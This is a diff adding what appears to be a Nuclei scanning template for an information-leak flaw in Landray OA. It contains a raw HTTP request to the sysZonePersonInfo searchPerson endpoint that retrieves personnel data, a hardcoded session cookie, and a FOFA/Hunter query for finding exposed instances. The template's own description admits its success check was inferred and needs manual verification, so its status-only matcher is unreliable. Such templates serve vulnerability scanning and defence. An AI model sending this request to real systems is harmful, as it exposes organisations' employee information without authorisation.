@@ -1,0 +1,35 @@
+id: poc-00761ca8e1f883b32f8b
+info:
+  name: 蓝凌OAEKPsyszonepersoninfo信息泄露
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/00761ca8e1f883b32f8b4a70d13b7140
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 00761ca8e1f883b32f8b4a70d13b7140
+    fofa: + hunter`app.name="Landray 蓝凌OA"`
+http:
+- raw:
+  - 'GET /sys/zone/sys_zone_personInfo/sysZonePersonInfo.do?.js?&method=searchPerson&orderby&ordertype=up&rowsize=5&s_ajax=true HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip, deflate
+
+    Cookie: JSESSIONID=9CC04B4FD006C0205D62AB2B2F497120
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
